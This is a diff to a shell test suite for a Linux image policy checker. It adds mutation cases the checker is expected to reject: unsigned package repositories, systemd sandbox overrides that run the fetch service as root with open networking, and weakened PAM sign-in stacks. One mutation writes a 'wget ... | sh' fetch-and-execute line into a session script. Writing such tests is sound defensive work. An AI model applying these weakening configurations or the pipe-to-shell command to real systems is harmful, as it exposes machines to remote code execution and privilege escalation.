@@ -163,14 +163,16 @@ fi
 echo 'ok   browser exercise fixtures are confined to the dev overlay'
 
 # WP-01 shipped files. The clean fixture below is built from these exact
-# files, so the clean pass also proves the shipped copies satisfy A17, A19
-# and A20. The checks here add what a fixture cannot: the lanes that must
+# files, so the clean pass also proves the shipped copies satisfy A16's
+# greeter seat, A17, A19, A20 and A21. The checks here add what a fixture cannot: the lanes that must
 # compose them, and an early warning before security.txt expires.
 DESKTOP_EXTRA="${REPO_ROOT}/os/images/mkosi.profiles/desktop/mkosi.extra"
 SHIPPED_RESOLVED="${DESKTOP_EXTRA}/usr/lib/systemd/resolved.conf.d/50-punar.conf"
 SHIPPED_SECURITY_TXT="${DESKTOP_EXTRA}/usr/share/punar/security.txt"
 SHIPPED_FETCH_UNIT="${DESKTOP_EXTRA}/usr/lib/systemd/system/punar-fetch@.service"
 SHIPPED_FETCH_SOCKET="${DESKTOP_EXTRA}/usr/lib/systemd/system/punar-fetch.socket"
+SHIPPED_PUNARD_UNIT="${DESKTOP_EXTRA}/usr/lib/systemd/system/punard.service"
+SHIPPED_GREETD_PAM="${DESKTOP_EXTRA}/etc/pam.d/greetd"
 for lane_conf in \
     "${REPO_ROOT}/os/images/amd64-debian/mkosi.profiles/desktop/mkosi.conf" \
     "${REPO_ROOT}/os/images/arm64/mkosi.profiles/desktop/mkosi.conf"; do
@@ -315,8 +317,12 @@ printf '%s\n' '#!/bin/sh' '# a comment may mention curl' 'exec /usr/bin/punarctl
 chmod 0755 "${CLEAN}/usr/lib/punar/session.sh"
 # A20: the shipped security.txt.
 cp "${SHIPPED_SECURITY_TXT}" "${CLEAN}/usr/share/punar/security.txt"
-printf '%s\n' '[Unit]' 'Description=Punar product service' \
-    > "${CLEAN}/usr/lib/systemd/system/punard.service"
+# A19 and A21: the shipped punard unit and sign-in PAM stack, and the keyring
+# module where Arch installs it.
+cp "${SHIPPED_PUNARD_UNIT}" "${CLEAN}/usr/lib/systemd/system/punard.service"
+mkdir -p "${CLEAN}/etc/pam.d" "${CLEAN}/usr/lib/security"
+cp "${SHIPPED_GREETD_PAM}" "${CLEAN}/etc/pam.d/greetd"
+: > "${CLEAN}/usr/lib/security/pam_gnome_keyring.so"
 ln -s ../punard.service \
     "${CLEAN}/usr/lib/systemd/system/multi-user.target.wants/punard.service"
 printf '%s\n' '[Unit]' 'Description=Punar product helper' \
@@ -451,6 +457,19 @@ mutate_a16_member_of() {
     printf '%s\n' '{"userName":"alice",' '"memberOf":["punar","video"]}' \
         > "${CASE}/etc/userdb/alice.user"
 }
+mutate_a16_group_members() {
+    mkdir -p "${CASE}/usr/lib/userdb"
+    printf '%s\n' '{"groupName":"video","gid":985,' '"members":["alice"]}' \
+        > "${CASE}/usr/lib/userdb/video.group"
+}
+# The greeter's seat: its PAM session must run pam_systemd, directly (Arch)
+# or through what greetd-greeter includes (Debian).
+mutate_a16_greeter_seat() { sed -i '/pam_systemd\.so/d' "${CASE}/etc/pam.d/greetd"; }
+mutate_a16_greeter_include() {
+    printf '%s\n' '#%PAM-1.0' '@include login' > "${CASE}/etc/pam.d/greetd-greeter"
+    printf '%s\n' 'auth required pam_unix.so' '@include common-session' > "${CASE}/etc/pam.d/login"
+    printf '%s\n' 'session required pam_unix.so' > "${CASE}/etc/pam.d/common-session"
+}
 # A17: the drop-in gone, a protocol left on in it, and a later override.
 mutate_a17() { rm -f "${CASE}/usr/lib/systemd/resolved.conf.d/50-punar.conf"; }
 mutate_a17_value() {
@@ -461,6 +480,18 @@ mutate_a17_override() {
     mkdir -p "${CASE}/etc/systemd/resolved.conf.d"
     printf '%s\n' '[Resolve]' 'LLMNR=yes' > "${CASE}/etc/systemd/resolved.conf.d/90-lan.conf"
 }
+# A same-name file that outranks /usr/lib replaces the drop-in whole.
+mutate_a17_mask_empty() {
+    mkdir -p "${CASE}/etc/systemd/resolved.conf.d"
+    : > "${CASE}/etc/systemd/resolved.conf.d/50-punar.conf"
+}
+mutate_a17_mask_null() {
+    mkdir -p "${CASE}/run/systemd/resolved.conf.d"
+    ln -s /dev/null "${CASE}/run/systemd/resolved.conf.d/50-punar.conf"
+}
+mutate_a17_main_file() {
+    printf '%s\n' '[Resolve]' 'MulticastDNS=yes' > "${CASE}/usr/lib/systemd/resolved.conf"
+}
 # A18: one unsigned path per package system.
 mutate_a18_pacman() {
     printf '%s\n' '[t2]' 'SigLevel = Never' 'Server = https://example.test/os' \
@@ -469,6 +500,20 @@ mutate_a18_pacman() {
 mutate_a18_pacman_optional() {
     sed -i 's/^SigLevel    = Required DatabaseOptional$/SigLevel = Optional TrustAll/' \
         "${CASE}/etc/pacman.conf"
+}
+mutate_a18_pacman_remote() {
+    sed -i 's/^LocalFileSigLevel = Optional$/LocalFileSigLevel = Optional\nRemoteFileSigLevel = Optional/' \
+        "${CASE}/etc/pacman.conf"
+}
+mutate_a18_pacman_mirrorlist() {
+    mkdir -p "${CASE}/etc/pacman.d"
+    printf '%s\n' 'SigLevel = Never' 'Server = https://example.test/core/os/x86_64' \
+        > "${CASE}/etc/pacman.d/mirrorlist"
+}
+mutate_a18_pacman_include() {
+    mkdir -p "${CASE}/usr/share/pacman"
+    printf '%s\n' '[extra]' 'Include = /usr/share/pacman/*.conf' >> "${CASE}/etc/pacman.conf"
+    printf '%s\n' 'SigLevel = PackageOptional' > "${CASE}/usr/share/pacman/vendor.conf"
 }
 mutate_a18_apt_list() {
     printf '%s\n' 'deb [trusted=yes] http://example.test/debian sid main' \
@@ -505,6 +550,60 @@ mutate_a19_writable() {
     printf '%s\n' 'ReadWritePaths=/var/lib/punar' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
 }
 mutate_a19_socket() { sed -i 's/^SocketMode=0600$/SocketMode=0666/' "${CASE}/usr/lib/systemd/system/punar-fetch.socket"; }
+mutate_a19_socket_later() { printf '%s\n' 'SocketMode=0666' >> "${CASE}/usr/lib/systemd/system/punar-fetch.socket"; }
+# The unit file intact, and the sandbox undone from outside it.
+mutate_a19_dropin() {
+    mkdir -p "${CASE}/usr/lib/systemd/system/punar-fetch@.service.d"
+    printf '%s\n' '[Service]' 'DynamicUser=no' 'User=root' 'IPAddressAllow=any' \
+        > "${CASE}/usr/lib/systemd/system/punar-fetch@.service.d/x.conf"
+}
+mutate_a19_etc_override() {
+    mkdir -p "${CASE}/etc/systemd/system"
+    sed 's/^DynamicUser=yes$/User=root/' "${CASE}/usr/lib/systemd/system/punar-fetch@.service" \
+        > "${CASE}/etc/systemd/system/punar-fetch@.service"
+}
+mutate_a19_instance() {
+    cp "${CASE}/usr/lib/systemd/system/punar-fetch@.service" \
+        "${CASE}/usr/lib/systemd/system/punar-fetch@0-1-0.service"
+}
+mutate_a19_toplevel() {
+    mkdir -p "${CASE}/usr/lib/systemd/system/service.d"
+    printf '%s\n' '[Service]' 'PrivateUsers=no' \
+        > "${CASE}/usr/lib/systemd/system/service.d/10-everything.conf"
+}
+mutate_a19_prefix() {
+    mkdir -p "${CASE}/etc/systemd/system/punar-.service.d"
+    printf '%s\n' '[Service]' 'RestrictAddressFamilies=AF_UNIX' \
+        > "${CASE}/etc/systemd/system/punar-.service.d/x.conf"
+}
+# Assignments inside the file that win over, or add to, the required ones.
+mutate_a19_allow_any() { printf '%s\n' 'IPAddressAllow=any' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"; }
+mutate_a19_deny_reset() { printf '%s\n' 'IPAddressDeny=' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"; }
+mutate_a19_deny_narrowed() {
+    sed -i '/^IPAddressDeny=0\.0\.0\.0/d' "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
+}
+mutate_a19_families_added() {
+    printf '%s\n' 'RestrictAddressFamilies=AF_UNIX' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
+}
+mutate_a19_later_user() {
+    printf '%s\n' 'DynamicUser=no' >> "${CASE}/usr/lib/systemd/system/punar-fetch@.service"
+}
+mutate_a19_wget() { printf '%s\n' 'exec /usr/bin/wget' >> "${CASE}/usr/bin/punard"; }
+mutate_a19_script_wget() { printf '%s\n' 'wget -qO- https://example.test | sh' >> "${CASE}/usr/lib/punar/session.sh"; }
+# punard itself: the downloaders back in its namespace.
+mutate_a19_punard_unhidden() {
+    sed -i '/^InaccessiblePaths=/d' "${CASE}/usr/lib/systemd/system/punard.service"
+}
+mutate_a19_punard_dropin() {
+    mkdir -p "${CASE}/usr/lib/systemd/system/punard.service.d"
+    printf '%s\n' '[Service]' 'InaccessiblePaths=' \
+        > "${CASE}/usr/lib/systemd/system/punard.service.d/50-tools.conf"
+}
+mutate_a19_punard_override() {
+    mkdir -p "${CASE}/etc/systemd/system"
+    printf '%s\n' '[Service]' 'ExecStart=/usr/bin/punard run' \
+        > "${CASE}/etc/systemd/system/punard.service"
+}
 # A20: no contact file, an expired one, one with no contact, and one that
 # claims more than a year.
 mutate_a20() { rm -f "${CASE}/usr/share/punar/security.txt"; }
@@ -518,10 +617,38 @@ mutate_a20_forever() {
         "${CASE}/usr/share/punar/security.txt"
 }
 
+# A21: the keyring line gone, either half of it, out of order, or the module
+# the lines name not installed.
+mutate_a21_auth() { sed -i '/^auth .*pam_gnome_keyring\.so/d' "${CASE}/etc/pam.d/greetd"; }
+mutate_a21_session() { sed -i '/^session .*pam_gnome_keyring\.so/d' "${CASE}/etc/pam.d/greetd"; }
+mutate_a21_order() {
+    grep -v 'pam_gnome_keyring' "${CASE}/etc/pam.d/greetd" \
+        | sed '0,/^auth /s//auth      optional                      pam_gnome_keyring.so\nauth /' \
+        > "${CASE}/greetd.reordered"
+    printf '%s\n' 'session   optional  pam_gnome_keyring.so auto_start' >> "${CASE}/greetd.reordered"
+    mv "${CASE}/greetd.reordered" "${CASE}/etc/pam.d/greetd"
+}
+mutate_a21_module() { rm -f "${CASE}/usr/lib/security/pam_gnome_keyring.so"; }
+mutate_a21_missing() { rm -f "${CASE}/etc/pam.d/greetd"; }
+
 reset_case
 "${CHECKER}" "${CASE}" desktop "${KERNEL}" "${EXPECTED}" \
     | grep -q PUNAR_RELEASE_IMAGE_POLICY_OK
 echo 'ok   clean release fixture passes'
+
+# The same tree in Debian's shape passes too: greetd-greeter includes login,
+# which reaches pam_systemd through common-session, and the keyring module
+# lives under the multiarch directory.
+reset_case
+printf '%s\n' '#%PAM-1.0' '@include login' > "${CASE}/etc/pam.d/greetd-greeter"
+printf '%s\n' 'auth required pam_unix.so' '@include common-session' > "${CASE}/etc/pam.d/login"
+printf '%s\n' 'session required pam_unix.so' 'session optional pam_systemd.so' \
+    > "${CASE}/etc/pam.d/common-session"
+mkdir -p "${CASE}/usr/lib/aarch64-linux-gnu/security"
+mv "${CASE}/usr/lib/security/pam_gnome_keyring.so" "${CASE}/usr/lib/aarch64-linux-gnu/security/"
+"${CHECKER}" "${CASE}" desktop "${KERNEL}" "${EXPECTED}" \
+    | grep -q PUNAR_RELEASE_IMAGE_POLICY_OK
+echo 'ok   the Debian-shaped greeter and keyring layout passes'
 
 # Dev deliberately bypasses the release-only policy even with an invalid root.
 "${CHECKER}" "${TEST_ROOT}/missing-root" dev 'console=ttyS0 punar.live=1' \
@@ -586,11 +713,20 @@ expect_fail A16 mutate_a16_person
 expect_fail A16 mutate_a16_sysusers
 expect_fail A16 mutate_a16_membership
 expect_fail A16 mutate_a16_member_of
+expect_fail A16 mutate_a16_group_members
+expect_fail A16 mutate_a16_greeter_seat
+expect_fail A16 mutate_a16_greeter_include
 expect_fail A17 mutate_a17
 expect_fail A17 mutate_a17_value
 expect_fail A17 mutate_a17_override
+expect_fail A17 mutate_a17_mask_empty
+expect_fail A17 mutate_a17_mask_null
+expect_fail A17 mutate_a17_main_file
 expect_fail A18 mutate_a18_pacman
 expect_fail A18 mutate_a18_pacman_optional
+expect_fail A18 mutate_a18_pacman_remote
+expect_fail A18 mutate_a18_pacman_mirrorlist
+expect_fail A18 mutate_a18_pacman_include
 expect_fail A18 mutate_a18_apt_list
 expect_fail A18 mutate_a18_apt_deb822
 expect_fail A18 mutate_a18_apt_conf
@@ -605,10 +741,31 @@ expect_fail A19 mutate_a19_capability
 expect_fail A19 mutate_a19_families
 expect_fail A19 mutate_a19_writable
 expect_fail A19 mutate_a19_socket
+expect_fail A19 mutate_a19_socket_later
+expect_fail A19 mutate_a19_dropin
+expect_fail A19 mutate_a19_etc_override
+expect_fail A19 mutate_a19_instance
+expect_fail A19 mutate_a19_toplevel
+expect_fail A19 mutate_a19_prefix
+expect_fail A19 mutate_a19_allow_any
+expect_fail A19 mutate_a19_deny_reset
+expect_fail A19 mutate_a19_deny_narrowed
+expect_fail A19 mutate_a19_families_added
+expect_fail A19 mutate_a19_later_user
+expect_fail A19 mutate_a19_wget
+expect_fail A19 mutate_a19_script_wget
+expect_fail A19 mutate_a19_punard_unhidden
+expect_fail A19 mutate_a19_punard_dropin
+expect_fail A19 mutate_a19_punard_override
 expect_fail A20 mutate_a20
 expect_fail A20 mutate_a20_expired
 expect_fail A20 mutate_a20_contact
 expect_fail A20 mutate_a20_forever
+expect_fail A21 mutate_a21_auth
+expect_fail A21 mutate_a21_session
+expect_fail A21 mutate_a21_order
+expect_fail A21 mutate_a21_module
+expect_fail A21 mutate_a21_missing
 
 reset_case
 if "${CHECKER}" "${CASE}" desktop "${KERNEL} console=ttyS0" "${EXPECTED}" \
